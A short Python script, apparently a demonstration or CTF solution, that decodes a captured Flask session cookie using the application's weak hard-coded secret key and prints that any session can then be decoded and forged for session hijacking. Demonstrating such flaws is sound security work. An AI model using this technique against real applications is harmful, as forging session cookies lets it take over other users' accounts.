import base64
import json
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'trump123'  # The weak secret key from the application

# Your actual session cookie
cookie = ".eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOko--emZeQpQflppjqJSbK3OIFEWmV-qUJ5alIqkMqdSISc_PT01RSG_tGQkGB6ro1RanFoUn5miZGVYCwBP6p2P.aQyYmQ.DbhGYhn9e2UHktXnji3dHhGOQHU"

print("=== DECODING YOUR CURRENT SESSION ===")
print(f"Session cookie: {cookie}")
print()

# Decode the session
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

try:
    session_data = serializer.loads(cookie)
    print("✅ Successfully decoded session!")
    print("Current session data:", session_data)
    print("Current user_id:", session_data.get('user_id'))
    print()
    
    # Show the vulnerability
    print("🚨 VULNERABILITY DEMONSTRATED:")
    print("- We know the secret key: 'trump123'")
    print("- We can decode any session cookie")
    print("- We can forge new session cookies")
    print("- This allows complete session hijacking!")
    
except Exception as e:
    print("❌ Error decoding session:", e)
    print("This might mean:")
    print("1. The cookie format changed")
    print("2. The secret key is different")
    print("3. The cookie is corrupted")
